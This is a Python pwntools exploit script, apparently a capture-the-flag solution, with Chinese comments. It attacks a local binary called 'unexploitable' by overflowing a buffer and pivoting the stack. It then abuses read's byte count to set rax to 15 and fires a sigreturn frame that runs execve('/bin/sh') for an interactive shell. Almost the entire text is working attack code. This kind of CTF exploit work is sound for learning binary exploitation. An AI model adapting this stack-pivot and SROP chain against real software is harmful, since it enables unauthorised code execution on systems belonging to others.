#!/usr/bin/python
#coding:utf-8

from pwn import *

context.update(os = 'linux', arch = 'amd64')

syscall_addr = 0x400560
set_read_addr = 0x40055b
read_addr = 0x400571
fake_stack_addr = 0x60116c
fake_ebp_addr = 0x60116c
binsh_addr = 0x60115c

io = process("./unexploitable")

payload = ""
payload += 'a'*16				#padding
payload += p64(fake_stack_addr)	#两次leave造成的stack pivot，第一次使rbp变为0x60116c, rbp+buf为0x60115c
payload += p64(set_read_addr)	#lea rax, [rbp+buf]; mov edx, 50Fh; mov rsi, rax; mov edi, 0; mov eax, 0; call _read
io.send(payload)
sleep(3)

frameExecve = SigreturnFrame()				#设置SROP Frame
frameExecve.rax = constants.SYS_execve
frameExecve.rdi = binsh_addr
frameExecve.rsi = 0
frameExecve.rdx = 0
frameExecve.rip = syscall_addr

payload = ""
payload += "/bin/sh\x00"				#\bin\sh，在0x60115c
payload += 'a'*8						#padding
payload += p64(fake_stack_addr+0x10)	#在0x60116c，leave指令之后rsp指向此处+8，+0x18之后指向syscall所在栈地址
payload += p64(read_addr)				#在0x601174，rsi, rdi, rdx不变，调用read，用下面的set rax输入15个字符设置rax = 15
payload += p64(fake_ebp_addr)			#call read下一行是leave, rsp再次被换成fake_stack_addr+0x10+8, 即0x60117c+8。随便设置了一个可读写地址
payload += p64(syscall_addr)			#在0x60117c+8，即0x601184，调用syscall。上一步的call read读取了15个字符，所以rax=0xf，这个syscall将会触发sys_sigreturn，触发SROP
payload += str(frameExecve)				#SigreturnFrame
io.send(payload)
sleep(1)
io.send('/bin/sh\x00' + ('a')*7)		#读取15个字符到0x60115c，目的是利用read返回值为读取的字节数的特性设置rax=0xf，注意不要使/bin/sh\x00字符串发生改变

io.interactive()